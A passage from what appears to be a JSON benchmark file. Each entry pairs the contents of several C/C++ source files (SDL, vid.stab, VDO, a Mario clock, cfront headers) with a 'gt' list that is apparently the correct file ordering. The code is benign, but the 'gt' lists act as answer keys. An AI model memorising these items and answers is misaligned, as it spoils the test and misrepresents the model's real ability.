sizeof(error_message)));\n\t\treturn -EIO;\n\t}\n}\n\n'vdo/utils/uds/time-utils.h'\n:\n\n\n#ifndef UDS_TIME_UTILS_H\n#define UDS_TIME_UTILS_H\n\n#include <linux/compiler.h>\n#include <linux/types.h>\n#include <sys/time.h>\n#include <time.h>\n\n\n#define NSEC_PER_SEC 1000000000L\n#define NSEC_PER_MSEC 1000000L\n#define NSEC_PER_USEC 1000L\n\ntypedef s64 ktime_t;\n\nstatic inline s64 ktime_to_seconds(ktime_t reltime)\n{\n\treturn reltime / NSEC_PER_SEC;\n}\n\nktime_t __must_check current_time_ns(clockid_t clock);\n\nktime_t __must_check current_time_us(void);\n\n\nstruct timespec future_time(ktime_t offset);\n\nstatic inline ktime_t ktime_sub(ktime_t a, ktime_t b)\n{\n\treturn a - b;\n}\n\nstatic inline s64 ktime_to_ms(ktime_t abstime)\n{\n\treturn abstime / NSEC_PER_MSEC;\n}\n\nstatic inline ktime_t ms_to_ktime(u64 milliseconds)\n{\n\treturn (ktime_t) milliseconds * NSEC_PER_MSEC;\n}\n\nstatic inline s64 ktime_to_us(ktime_t reltime)\n{\n\treturn reltime / NSEC_PER_USEC;\n}\n\n#endif\n\n'vdo/utils/uds/thread-utils.h'\n:\n\n\n#ifndef THREAD_UTILS_H\n#define THREAD_UTILS_H\n\n#include <linux/atomic.h>\n#include <pthread.h>\n#include <sched.h>\n#include <semaphore.h>\n#include <stdbool.h>\n\n#include \"errors.h\"\n#include \"time-utils.h\"\n\n\n\nstruct mutex {\n\tpthread_mutex_t mutex;\n};\n\nstruct semaphore {\n\tsem_t semaphore;\n};\n\nstruct thread {\n\tpthread_t thread;\n};\n\nstruct threads_barrier {\n\tpthread_barrier_t barrier;\n};\n\n#ifndef NDEBUG\n#define UDS_MUTEX_INITIALIZER { .mutex = PTHREAD_ERRORCHECK_MUTEX_INITIALIZER_NP }\n#else\n#define UDS_MUTEX_INITIALIZER { .mutex = PTHREAD_MUTEX_INITIALIZER }\n#endif\n\nextern const bool UDS_DO_ASSERTIONS;\n\nunsigned int num_online_cpus(void);\npid_t __must_check uds_get_thread_id(void);\n\nvoid vdo_perform_once(atomic_t *once_state, void (*function) (void));\n\nint __must_check vdo_create_thread(void (*thread_function)(void *), void *thread_data,\n\t\t\t\t   const char *name, struct thread **new_thread);\nvoid vdo_join_threads(struct thread *thread);\n\nvoid uds_get_thread_name(char *name);\n\nstatic inline void cond_resched(void)\n{\n\n\t(void) sched_yield();\n}\n\nint uds_initialize_mutex(struct mutex *mutex, bool assert_on_error);\nint __must_check uds_init_mutex(struct mutex *mutex);\nint uds_destroy_mutex(struct mutex *mutex);\nvoid uds_lock_mutex(struct mutex *mutex);\nvoid uds_unlock_mutex(struct mutex *mutex);\n\nvoid initialize_threads_barrier(struct threads_barrier *barrier,\n\t\t\t\tunsigned int thread_count);\nvoid destroy_threads_barrier(struct threads_barrier *barrier);\nvoid enter_threads_barrier(struct threads_barrier *barrier);\n\nint __must_check uds_initialize_semaphore(struct semaphore *semaphore,\n\t\t\t\t\t  unsigned int value);\nint uds_destroy_semaphore(struct semaphore *semaphore);\nvoid uds_acquire_semaphore(struct semaphore *semaphore);\nbool __must_check uds_attempt_semaphore(struct semaphore *semaphore, ktime_t timeout);\nvoid uds_release_semaphore(struct semaphore *semaphore);\n\n#endif\n",
        "gt": [
            "'vdo/utils/uds/time-utils.h'",
            "'vdo/utils/uds/thread-utils.h'",
            "'vdo/utils/vdo/status-codes.c'"
        ]
    },
    {
        "files": [
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_cpuinfo.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test_common.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test.h'"
        ],
        "content": "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_cpuinfo.h'\n:\n\n\n\n#ifndef _SDL_cpuinfo_h\n#define _SDL_cpuinfo_h\n\n#include \"SDL_stdinc.h\"\n\n\n\n#if defined(_MSC_VER) && (_MSC_VER >= 1500) && (defined(_M_IX86) || defined(_M_X64))\n#include <intrin.h>\n#ifndef _WIN64\n#define __MMX__\n#define __3dNOW__\n#endif\n#define __SSE__\n#define __SSE2__\n#elif defined(__MINGW64_VERSION_MAJOR)\n#include <intrin.h>\n#else\n#ifdef __ALTIVEC__\n#if HAVE_ALTIVEC_H && !defined(__APPLE_ALTIVEC__)\n#include <altivec.h>\n#undef pixel\n#endif\n#endif\n#ifdef __MMX__\n#include <mmintrin.h>\n#endif\n#ifdef __3dNOW__\n#include <mm3dnow.h>\n#endif\n#ifdef __SSE__\n#include <xmmintrin.h>\n#endif\n#ifdef __SSE2__\n#include <emmintrin.h>\n#endif\n#endif\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n#define SDL_CACHELINE_SIZE  128\n\n\nextern DECLSPEC int SDLCALL SDL_GetCPUCount(void);\n\n\nextern DECLSPEC int SDLCALL SDL_GetCPUCacheLineSize(void);\n\n\nextern DECLSPEC SDL_bool SDLCALL SDL_HasRDTSC(void);\n\n\nextern DECLSPEC SDL_bool SDLCALL SDL_HasAltiVec(void);\n\n\nextern DECLSPEC SDL_bool SDLCALL SDL_HasMMX(void);\n\n\nextern DECLSPEC SDL_bool SDLCALL SDL_Has3DNow(void);\n\n\nextern DECLSPEC SDL_bool SDLCALL SDL_HasSSE(void);\n\n\nextern DECLSPEC SDL_bool SDLCALL SDL_HasSSE2(void);\n\n\nextern DECLSPEC SDL_bool SDLCALL SDL_HasSSE3(void);\n\n\nextern DECLSPEC SDL_bool SDLCALL SDL_HasSSE41(void);\n\n\nextern DECLSPEC SDL_bool SDLCALL SDL_HasSSE42(void);\n\n\nextern DECLSPEC SDL_bool SDLCALL SDL_HasAVX(void);\n\n\nextern DECLSPEC SDL_bool SDLCALL SDL_HasAVX2(void);\n\n\nextern DECLSPEC int SDLCALL SDL_GetSystemRAM(void);\n\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL.h'\n:\n\n\n\n\n#ifndef _SDL_H\n#define _SDL_H\n\n#include \"SDL_main.h\"\n#include \"SDL_stdinc.h\"\n#include \"SDL_assert.h\"\n#include \"SDL_atomic.h\"\n#include \"SDL_audio.h\"\n#include \"SDL_clipboard.h\"\n#include \"SDL_cpuinfo.h\"\n#include \"SDL_endian.h\"\n#include \"SDL_error.h\"\n#include \"SDL_events.h\"\n#include \"SDL_filesystem.h\"\n#include \"SDL_joystick.h\"\n#include \"SDL_gamecontroller.h\"\n#include \"SDL_haptic.h\"\n#include \"SDL_hints.h\"\n#include \"SDL_loadso.h\"\n#include \"SDL_log.h\"\n#include \"SDL_messagebox.h\"\n#include \"SDL_mutex.h\"\n#include \"SDL_power.h\"\n#include \"SDL_render.h\"\n#include \"SDL_rwops.h\"\n#include \"SDL_system.h\"\n#include \"SDL_thread.h\"\n#include \"SDL_timer.h\"\n#include \"SDL_version.h\"\n#include \"SDL_video.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n\n\n\n#define SDL_INIT_TIMER          0x00000001u\n#define SDL_INIT_AUDIO          0x00000010u\n#define SDL_INIT_VIDEO          0x00000020u\n#define SDL_INIT_JOYSTICK       0x00000200u\n#define SDL_INIT_HAPTIC         0x00001000u\n#define SDL_INIT_GAMECONTROLLER 0x00002000u\n#define SDL_INIT_EVENTS         0x00004000u\n#define SDL_INIT_NOPARACHUTE    0x00100000u\n#define SDL_INIT_EVERYTHING ( \\\n                SDL_INIT_TIMER | SDL_INIT_AUDIO | SDL_INIT_VIDEO | SDL_INIT_EVENTS | \\\n                SDL_INIT_JOYSTICK | SDL_INIT_HAPTIC | SDL_INIT_GAMECONTROLLER \\\n            )\n\n\n\nextern DECLSPEC int SDLCALL SDL_Init(Uint32 flags);\n\n\nextern DECLSPEC int SDLCALL SDL_InitSubSystem(Uint32 flags);\n\n\nextern DECLSPEC void SDLCALL SDL_QuitSubSystem(Uint32 flags);\n\n\nextern DECLSPEC Uint32 SDLCALL SDL_WasInit(Uint32 flags);\n\n\nextern DECLSPEC void SDLCALL SDL_Quit(void);\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test_common.h'\n:\n\n\n\n\n\n#ifndef _SDL_test_common_h\n#define _SDL_test_common_h\n\n#include \"SDL.h\"\n\n#if defined(__PSP__)\n#define DEFAULT_WINDOW_WIDTH  480\n#define DEFAULT_WINDOW_HEIGHT 272\n#else\n#define DEFAULT_WINDOW_WIDTH  640\n#define DEFAULT_WINDOW_HEIGHT 480\n#endif\n\n#define VERBOSE_VIDEO   0x00000001\n#define VERBOSE_MODES   0x00000002\n#define VERBOSE_RENDER  0x00000004\n#define VERBOSE_EVENT   0x00000008\n#define VERBOSE_AUDIO   0x00000010\n\ntypedef struct\n{\n\n    char **argv;\n    Uint32 flags;\n    Uint32 verbose;\n\n\n    const char *videodriver;\n    int display;\n    const char *window_title;\n    const char *window_icon;\n    Uint32 window_flags;\n    int window_x;\n    int window_y;\n    int window_w;\n    int window_h;\n    int window_minW;\n    int window_minH;\n    int window_maxW;\n    int window_maxH;\n    int logical_w;\n    int logical_h;\n    float scale;\n    int depth;\n    int refresh_rate;\n    int num_windows;\n    SDL_Window **windows;\n\n\n    const char *renderdriver;\n    Uint32 render_flags;\n    SDL_bool skip_renderer;\n    SDL_Renderer **renderers;\n    SDL_Texture **targets;\n\n\n    const char *audiodriver;\n    SDL_AudioSpec audiospec;\n\n\n    int gl_red_size;\n    int gl_green_size;\n    int gl_blue_size;\n    int gl_alpha_size;\n    int gl_buffer_size;\n    int gl_depth_size;\n    int gl_stencil_size;\n    int gl_double_buffer;\n    int gl_accum_red_size;\n    int gl_accum_green_size;\n    int gl_accum_blue_size;\n    int gl_accum_alpha_size;\n    int gl_stereo;\n    int gl_multisamplebuffers;\n    int gl_multisamplesamples;\n    int gl_retained_backing;\n    int gl_accelerated;\n    int gl_major_version;\n    int gl_minor_version;\n    int gl_debug;\n    int gl_profile_mask;\n} SDLTest_CommonState;\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n\n\nSDLTest_CommonState *SDLTest_CommonCreateState(char **argv, Uint32 flags);\n\n\nint SDLTest_CommonArg(SDLTest_CommonState * state, int index);\n\n\nconst char *SDLTest_CommonUsage(SDLTest_CommonState * state);\n\n\nSDL_bool SDLTest_CommonInit(SDLTest_CommonState * state);\n\n\nvoid SDLTest_CommonEvent(SDLTest_CommonState * state, SDL_Event * event, int *done);\n\n\nvoid SDLTest_CommonQuit(SDLTest_CommonState * state);\n\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test.h'\n:\n\n\n\n#ifndef _SDL_test_h\n#define _SDL_test_h\n\n#include \"SDL.h\"\n#include \"SDL_test_common.h\"\n#include \"SDL_test_font.h\"\n#include \"SDL_test_random.h\"\n#include \"SDL_test_fuzzer.h\"\n#include \"SDL_test_crc32.h\"\n#include \"SDL_test_md5.h\"\n#include \"SDL_test_log.h\"\n#include \"SDL_test_assert.h\"\n#include \"SDL_test_harness.h\"\n#include \"SDL_test_images.h\"\n#include \"SDL_test_compare.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n\n\n#define SDLTEST_MAX_LOGMESSAGE_LENGTH   3584\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n",
        "gt": [
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_cpuinfo.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test_common.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test.h'"
        ]
    },
    {
        "files": [
            "'vid.stab/src/libvidstab.c'",
            "'vid.stab/src/libvidstab.h'",
            "'vid.stab/src/frameinfo.h'"
        ],
        "content": "'vid.stab/src/libvidstab.c'\n:\n\n#include \"libvidstab.h\"\n\n#include <string.h>\n#include <stdio.h>\n#include <stdarg.h>\n\n\n\n\nvoid* _zalloc(size_t size){\n    return memset(malloc(size),0,size);\n}\n\n\nint _vs_log(int type, const char* tag, const char* format, ...){\n    if(vs_log_level >= type){\n        fprintf(stderr,\"%s (%s):\",\n                type == VS_ERROR_TYPE ? \"Error: \" :\n                type == VS_WARN_TYPE  ? \"Warn:  \" :\n                type == VS_INFO_TYPE  ? \"Info:  \" :\n                type == VS_MSG_TYPE   ? \"Msg:   \" : \"Unknown\",\n                tag);\n        va_list ap;\n        va_start (ap, format);\n        vfprintf (stderr, format, ap);\n        va_end (ap);\n        fprintf(stderr,\"\\n\");\n    }\n    return 0;\n}\n\n\nvs_malloc_t vs_malloc   = malloc;\nvs_realloc_t vs_realloc = realloc;\nvs_free_t vs_free       = free;\nvs_zalloc_t vs_zalloc   = _zalloc;\n\nvs_strdup_t vs_strdup   = strdup;\n\nvs_log_t vs_log         = _vs_log;\nint VS_ERROR_TYPE = 0;\nint VS_WARN_TYPE  = 1;\nint VS_INFO_TYPE  = 2;\nint VS_MSG_TYPE   = 3;\n\nint VS_ERROR     = -1;\nint VS_OK        = 0;\n\nint vs_log_level = 4;\n\n\n\n'vid.stab/src/libvidstab.h'\n:\n\n#ifndef LIBVIDSTAB_H\n#define LIBVIDSTAB_H\n\n#define LIBVIDSTAB_VERSION \"v1.1 (2015-05-16)\"\n\n#include \"frameinfo.h\"\n#include \"motiondetect.h\"\n#include \"transform.h\"\n#include \"vsvector.h\"\n#include \"serialize.h\"\n#include \"localmotion2transform.h\"\n\n#endif\n\n\n\n'vid.stab/src/frameinfo.h'\n:\n#ifndef FRAMEINFO_H\n#define FRAMEINFO_H\n\n#include <stddef.h>\n#include <stdlib.h>\n#include <inttypes.h>\n\n\ntypedef enum {PF_NONE = -1,\n              PF_GRAY8,\n              PF_YUV420P,\n              PF_YUV422P,\n              PF_YUV444P,\n              PF_YUV410P,\n              PF_YUV411P,\n              PF_YUV440P,\n              PF_YUVA420P,\n              PF_PACKED,\n              PF_RGB24,\n              PF_BGR24,\n              PF_RGBA,\n              PF_NUMBER\n} VSPixelFormat;\n\n\ntypedef struct vsframeinfo {\n  int width, height;\n  int planes;\n  int log2ChromaW;\n  int log2ChromaH;\n  VSPixelFormat pFormat;\n  int bytesPerPixel;\n} VSFrameInfo;\n\n\ntypedef struct vsframe {\n  uint8_t* data[4];\n  int linesize[4];\n} VSFrame;\n\n\n#define CHROMA_SIZE(width,log2sub)  (-(-(width) >> (log2sub)))\n\n\nint vsFrameInfoInit(VSFrameInfo* fi, int width, int height, VSPixelFormat pFormat);\n\n\n\nint vsGetPlaneWidthSubS(const VSFrameInfo* fi, int plane);\n\n\nint vsGetPlaneHeightSubS(const VSFrameInfo* fi, int plane);\n\n\nvoid vsFrameNull(VSFrame* frame);\n\n\nint vsFrameIsNull(const VSFrame* frame);\n\n\nint vsFramesEqual(const VSFrame* frame1,const VSFrame* frame2);\n\n\nvoid vsFrameAllocate(VSFrame* frame, const VSFrameInfo* fi);\n\n\n\nvoid vsFrameCopyPlane(VSFrame* dest, const VSFrame* src,\n                    const VSFrameInfo* fi, int plane);\n\n\nvoid vsFrameCopy(VSFrame* dest, const VSFrame* src, const VSFrameInfo* fi);\n\n\nvoid vsFrameFillFromBuffer(VSFrame* frame, uint8_t* img, const VSFrameInfo* fi);\n\n\nvoid vsFrameFree(VSFrame* frame);\n\n#endif\n\n\n",
        "gt": [
            "'vid.stab/src/frameinfo.h'",
            "'vid.stab/src/libvidstab.h'",
            "'vid.stab/src/libvidstab.c'"
        ]
    },
    {
        "files": [
            "'mariobros-clock/Locator.h'",
            "'mariobros-clock/mario.h'",
            "'mariobros-clock/EventBus.h'",
            "'mariobros-clock/Clockface.h'",
            "'mariobros-clock/EventTask.h'"
        ],
        "content": "'mariobros-clock/Locator.h'\n:#ifndef Locator_h\n#define Locator_h\n\n\n#include <Adafruit_GFX.h>\n#include \"EventBus.h\"\n\nclass Locator {\n  private:\n    static Adafruit_GFX* _display;\n    static EventBus* _eventBus;\n\n  public:\n    static Adafruit_GFX* getDisplay();\n    static EventBus* getEventBus();\n    static void provide(Adafruit_GFX* display);\n    static void provide(EventBus* eventBus);\n};\n\n\n#endif\n'mariobros-clock/mario.h'\n:#ifndef Mario_h\n#define Mario_h\n\n\n#include \"Game.h\"\n#include \"Locator.h\"\n#include \"EventBus.h\"\n#include \"assets.h\"\n\n\nconst uint8_t MARIO_PACE = 3;\nconst uint8_t MARIO_JUMP_HEIGHT = 14;\n\n\nclass Mario: public Sprite, public EventTask {\n  private:\n\n    enum State {\n      IDLE,\n      WALKING,\n      JUMPING\n    };\n\n    Direction direction;\n\n    int _lastX;\n    int _lastY;\n\n    const unsigned short* _sprite;\n    unsigned long lastMillis = 0;\n    State _state = IDLE;\n    State _lastState = IDLE;\n\n    void idle();\n\n  public:\n    Mario(int x, int y);\n    void init();\n    void move(Direction dir, int times);\n    void jump();\n    void update();\n    const char* name();\n    void execute(EventType event, Sprite* caller);\n\n};\n\n\n#endif\n'mariobros-clock/EventBus.h'\n:\n#ifndef EventBus_h\n#define EventBus_h\n\n#include <Arduino.h>\n#include \"EventTask.h\"\n#include \"Sprite.h\"\n\nclass EventBus {\n  private:\n    EventTask* _subscriptions[5];\n    uint8_t _subNum = 0;\n\n  public:\n    void broadcast(EventType event, Sprite* sender);\n    void subscribe(EventTask* task);\n\n};\n\n\n#endif\n\n'mariobros-clock/Clockface.h'\n:#ifndef MarioClockface_h\n#define MarioClockface_h\n\n#include \"Super_Mario_Bros__24pt7b.h\"\n\n#include <Adafruit_GFX.h>\n#include \"Tile.h\"\n#include \"Locator.h\"\n#include \"Game.h\"\n#include \"Object.h\"\n\n#include \"IClockface.h\"\n#include \"CWDateTime.h\"\n\n#include \"assets.h\"\n#include \"mario.h\"\n#include \"block.h\"\n\nclass Clockface: public IClockface {\n  private:\n    Adafruit_GFX* _display;\n    CWDateTime* _dateTime;\n    void updateTime();\n\n  public:\n    Clockface(Adafruit_GFX* display);\n    void setup(CWDateTime *dateTime);\n    void update();\n    void externalEvent(int type);\n};\n\n#endif\n\n'mariobros-clock/EventTask.h'\n:\n#ifndef EventTask_h\n#define EventTask_h\n\n\n#include \"Sprite.h\"\n\nenum EventType {\n    MOVE,\n    COLLISION\n};\n\nclass EventTask {\n  public:\n    virtual void execute(EventType event, Sprite* caller) = 0;\n};\n\n\n#endif\n\n\n\n",
        "gt": [
            "'mariobros-clock/EventTask.h'",
            "'mariobros-clock/EventBus.h'",
            "'mariobros-clock/Locator.h'",
            "'mariobros-clock/mario.h'",
            "'mariobros-clock/Clockface.h'"
        ]
    },
    {
        "files": [
            "'cfront-3/libSC/publik/CXXToken.h'",
            "'cfront-3/libSC/publik/Token.h'",
            "'cfront-3/libSC/hier/CXXToken.c'",
            "'cfront-3/libSC/publik/TokenType.h'"
        ],
        "content": "'cfront-3/libSC/publik/CXXToken.h'\n:\n\n\n#include \"Token.h\"\n\n\n\nclass Litint : public Token {\npublic:\n\tLitint()\t\t\t\t{ type = LITINT; }\n\tLitint(const Token &base): Token(base)\t{ type = LITINT; }\n\tint intval;\n};\n\nclass Litstring : public Token {\npublic:\n\tLitstring()\t\t\t\t\t{ type = LITSTRING; }\n\tLitstring(const Token &base): Token(base)\t{ type = LITSTRING; }\n\n\n\tString thestring;\n};\n\n\n\n'cfront-3/libSC/publik/Token.h'\n:\n\n\n#ifndef _TOKEN_H\n#define _TOKEN_H\n\n#include \"TokenType.h\"\n#include <String.h>\n\nclass Token\n{\npublic:\n\n\n\tString ws;\n\tint lineno;\n\tString lexeme;\n\tTokenType type;\n};\n\nostream &operator<<(ostream &oo, const Token &t);\n\n#endif\n\n'cfront-3/libSC/hier/CXXToken.c'\n:\n\n\n#include \"CXXToken.h\"\n#include <iostream.h>\n\nstatic char *tokname[] = { \"New\", \"Delete\", \"Void\", \"Id\", \"Lp\",\n\t\"Rp\", \"Lc\", \"Rc\", \"Star\", \"Qual\", \"Operator\", \"Semi\",\n\t\"Comma\", \"Pound\", \"Litint\", \"Litstring\", \"Eof\", \"Othertok\",\n\t\"Colon\", \"Public\", \"Private\", \"Protected\", \"Virtual\",\n\t\"Class\", \"Struct\", \"Union\", \"Nl\", \"Ls\", \"Rs\", \"CComment\", \"C++Comment\",\n\t\"Const\", \"Friend\", \"Langle\", \"Rangle\", \"Template\" };\n\nostream &operator<<(ostream &oo, const Token &t)\n{\n\too << \"<\" << tokname[t.type] << \", \" << t.lexeme << \", \" << t.lineno << \">\" << flush;\n\treturn oo;\n}\n\n'cfront-3/libSC/publik/TokenType.h'\n:\n\n\n#ifndef TOKENTYPEH\n#define TOKENTYPEH\n\n#if 0\n\nThe C++ tokens:\n\nNEW\t\t: \"new\"\nDELETE\t\t: \"delete\"\nVOID\t\t: \"void\"\nOPERATOR\t: \"operator\"\nCONST\t\t: \"const\"\nFRIEND\t\t: \"friend\"\nVIRTUAL\t\t: \"virtual\"\nPUBLIC\t\t: \"public\"\nPRIVATE\t\t: \"private\"\nPROTECTED\t: \"protected\"\nCLASS\t\t: \"class\"\nAGGR\t\t: one of \"struct\" \"union\"\nID\t\t: identifier or keyword other than the above\nLITSTRING\t: literal string or character constant\nLITINT\t\t: literal decimal integer\nNL\t\t: newline character (but only considered a token if the\n\t\t  global flag newlineIsToken is on)\nCCOMMENT\t: C-style comment (but only considered a token if the\n\t\t  global flag commentIsToken is on)\nCXXCOMMENT\t: C++-style comment (but only considered a token if the\n\t\t  global flag commentIsToken is on)\nCOLON\t\t: \":\"\nSEMI\t\t: \";\"\nCOMMA\t\t: \",\"\nSTAR\t\t: \"*\"\nPOUND\t\t: \"#\"\nLP\t\t: \"(\"\nRP\t\t: \")\"\nLC\t\t: \"{\"\nRC\t\t: \"}\"\nLS\t\t: \"[\"\nRS\t\t: \"]\"\nQUAL\t\t: \"::\"\nEOFTOK\t\t: end of input\nOTHERTOK\t: anything else\n\n#endif\n\n\n\n\n\nenum TokenType { NEW, DELETE, VOID, ID, LP, RP, LC, RC, STAR,\n\tQUAL,  OPERATOR, SEMI, COMMA, POUND, LITINT, LITSTRING,\n\tEOFTOK, OTHERTOK, COLON, PUBLIC, PRIVATE, PROTECTED,\n\tVIRTUAL, CLASS, AGGR, NL, LS, RS, CCOMMENT, CXXCOMMENT,\n\tCONST, FRIEND, LANGLE, RANGLE, TEMPLATE\n};\n\n#endif\n",
        "gt": [
            "'cfront-3/libSC/publik/TokenType.h'",
            "'cfront-3/libSC/publik/Token.h'",
            "'cfront-3/libSC/publik/CXXToken.h'",
            "'cfront-3/libSC/hier/CXXToken.c'"
        ]
    },
    {
        "files": [
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test_compare.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_power.h'"
        ],
        "content": "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test_compare.h'\n:\n\n\n\n\n\n#ifndef _SDL_test_compare_h\n#define _SDL_test_compare_h\n\n#include \"SDL.h\"\n\n#include \"SDL_test_images.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\nint SDLTest_CompareSurfaces(SDL_Surface *surface, SDL_Surface *referenceSurface, int allowable_error);\n\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test.h'\n:\n\n\n\n#ifndef _SDL_test_h\n#define _SDL_test_h\n\n#include \"SDL.h\"\n#include \"SDL_test_common.h\"\n#include \"SDL_test_font.h\"\n#include \"SDL_test_random.h\"\n#include \"SDL_test_fuzzer.h\"\n#include \"SDL_test_crc32.h\"\n#include \"SDL_test_md5.h\"\n#include \"SDL_test_log.h\"\n#include \"SDL_test_assert.h\"\n#include \"SDL_test_harness.h\"\n#include \"SDL_test_images.h\"\n#include \"SDL_test_compare.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n\n\n#define SDLTEST_MAX_LOGMESSAGE_LENGTH   3584\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL.h'\n:\n\n\n\n\n#ifndef _SDL_H\n#define _SDL_H\n\n#include \"SDL_main.h\"\n#include \"SDL_stdinc.h\"\n#include \"SDL_assert.h\"\n#include \"SDL_atomic.h\"\n#include \"SDL_audio.h\"\n#include \"SDL_clipboard.h\"\n#include \"SDL_cpuinfo.h\"\n#include \"SDL_endian.h\"\n#include \"SDL_error.h\"\n#include \"SDL_events.h\"\n#include \"SDL_filesystem.h\"\n#include \"SDL_joystick.h\"\n#include \"SDL_gamecontroller.h\"\n#include \"SDL_haptic.h\"\n#include \"SDL_hints.h\"\n#include \"SDL_loadso.h\"\n#include \"SDL_log.h\"\n#include \"SDL_messagebox.h\"\n#include \"SDL_mutex.h\"\n#include \"SDL_power.h\"\n#include \"SDL_render.h\"\n#include \"SDL_rwops.h\"\n#include \"SDL_system.h\"\n#include \"SDL_thread.h\"\n#include \"SDL_timer.h\"\n#include \"SDL_version.h\"\n#include \"SDL_video.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n\n\n\n#define SDL_INIT_TIMER          0x00000001u\n#define SDL_INIT_AUDIO          0x00000010u\n#define SDL_INIT_VIDEO          0x00000020u\n#define SDL_INIT_JOYSTICK       0x00000200u\n#define SDL_INIT_HAPTIC         0x00001000u\n#define SDL_INIT_GAMECONTROLLER 0x00002000u\n#define SDL_INIT_EVENTS         0x00004000u\n#define SDL_INIT_NOPARACHUTE    0x00100000u\n#define SDL_INIT_EVERYTHING ( \\\n                SDL_INIT_TIMER | SDL_INIT_AUDIO | SDL_INIT_VIDEO | SDL_INIT_EVENTS | \\\n                SDL_INIT_JOYSTICK | SDL_INIT_HAPTIC | SDL_INIT_GAMECONTROLLER \\\n            )\n\n\n\nextern DECLSPEC int SDLCALL SDL_Init(Uint32 flags);\n\n\nextern DECLSPEC int SDLCALL SDL_InitSubSystem(Uint32 flags);\n\n\nextern DECLSPEC void SDLCALL SDL_QuitSubSystem(Uint32 flags);\n\n\nextern DECLSPEC Uint32 SDLCALL SDL_WasInit(Uint32 flags);\n\n\nextern DECLSPEC void SDLCALL SDL_Quit(void);\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_power.h'\n:\n\n#ifndef _SDL_power_h\n#define _SDL_power_h\n\n\n\n#include \"SDL_stdinc.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\ntypedef enum\n{\n    SDL_POWERSTATE_UNKNOWN,\n    SDL_POWERSTATE_ON_BATTERY,\n    SDL_POWERSTATE_NO_BATTERY,\n    SDL_POWERSTATE_CHARGING,\n    SDL_POWERSTATE_CHARGED\n} SDL_PowerState;\n\n\n\nextern DECLSPEC SDL_PowerState SDLCALL SDL_GetPowerInfo(int *secs, int *pct);\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n",
        "gt": [
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_power.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test_compare.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test.h'"
        ]
    },
    {
        "files": [
            "'txproto/src/include/libtxproto/txproto_main.h'",
            "'txproto/src/control.c'",
            "'txproto/src/cli.h'",
            "'txproto/src/include/libtxproto/control.h'"
        ],
